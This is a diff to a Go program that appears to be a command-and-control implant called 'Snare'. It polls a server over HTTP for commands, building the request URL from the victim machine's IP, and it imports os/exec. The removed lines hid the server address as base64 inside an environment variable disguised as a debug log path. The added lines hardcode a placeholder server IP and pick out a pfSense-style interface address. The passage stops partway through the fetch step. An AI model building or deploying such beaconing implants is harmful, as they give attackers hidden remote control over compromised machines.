@@ -5,38 +5,49 @@
 package main
 
 import (
-	b64 "encoding/base64"
+	"fmt"
 	"io"
 	"io/ioutil"
+	"math/rand"
 	"net"
 	"net/http"
-	"os"
 	"os/exec"
 	"strings"
 	"time"
 )
 
-var serv = getServer() //IP of flask serv
-var src = "Snare"      // where is this calling back from
-var loopTime = 10      //sleep time in secs
+var src = "Snare" // where is this calling back from
+var loopTime = 60 //sleep time in secs
 
 func getServer() string {
-	envVar := os.Getenv("DEBUGGER_LOGGING") //fetch environment variable
-	trimmedStr := strings.Replace(envVar, "/var/log/system-", "", 1)
-	decoded, _ := b64.StdEncoding.DecodeString(trimmedStr)
-	return string(decoded)
+	//envVar := os.Getenv("DEBUGGER_LOGGING") //fetch environment variable
+	//trimmedStr := strings.Replace(envVar, "/var/log/system-", "", 1)
+	//decoded, _ := b64.StdEncoding.DecodeString(trimmedStr)
+	//return string(decoded)
+	servs := make([]string, 0)
+	servs = append(servs,
+		"1.2.3.4",
+	)
+	selection := servs[rand.Intn(len(servs))]
+	return string(selection)
 }
 
 func getIP() string {
-	conn, _ := net.Dial("udp", "8.8.8.8:80")
-	defer conn.Close()
-	ad := conn.LocalAddr().(*net.UDPAddr)
-	ipStr := ad.IP.String()
-	return ipStr
+	t, _ := net.InterfaceAddrs()
+	for _, ip := range t {
+		if strings.Contains(ip.String(), ".2.1") {
+			fmt.Println(ip.String())
+			i := ip.String()
+			real_i := strings.Split(i, "/")[0]
+			return real_i
+		}
+	}
+	return "unknown-pfsense"
 }
 
 func getCommands() {
 	ip := getIP()
+	serv := getServer()
 	url := "http://" + serv + "/" + ip + "/" + src
 	r, err := http.Get(url)
 	if err != nil {
